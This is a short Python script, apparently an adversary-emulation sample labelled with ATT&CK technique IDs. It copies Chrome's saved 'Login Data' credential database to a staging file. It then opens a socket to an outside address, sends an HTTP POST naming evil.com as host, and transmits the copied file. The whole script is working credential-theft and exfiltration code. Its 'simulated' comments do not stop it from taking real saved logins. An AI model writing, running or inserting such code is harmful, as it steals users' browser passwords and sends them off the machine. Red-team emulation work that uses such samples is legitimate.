import os
import shutil
import socket
import json

def steal_credentials():
    # T1555.003 Credentials from Web Browsers
    appdata = os.getenv("LOCALAPPDATA", "C:\\Temp")
    chrome_data = os.path.join(appdata, "Google", "Chrome", "User Data", "Default", "Login Data")
    
    staged_data = "C:\\Temp\\stolen_creds.db"
    try:
        if os.path.exists(chrome_data):
            shutil.copy2(chrome_data, staged_data)
            print("Credentials staged.")
        else:
            # Simulate staging if Chrome is not installed
            with open(staged_data, "w") as f:
                f.write("sqlite format 3... [fake credentials]")
    except Exception as e:
        print(f"Failed to stage: {e}")

    return staged_data

def exfiltrate(filepath):
    # T1048 Exfiltration Over Alternative Protocol
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("1.1.1.1", 80)) # Simulated drop zone
        s.send(b"POST /upload HTTP/1.1\r\nHost: evil.com\r\n\r\n")
        
        if os.path.exists(filepath):
            with open(filepath, "rb") as f:
                s.send(f.read())
        s.close()
        print("Data exfiltrated.")
    except Exception as e:
        pass

if __name__ == "__main__":
    staged_file = steal_credentials()
    exfiltrate(staged_file)
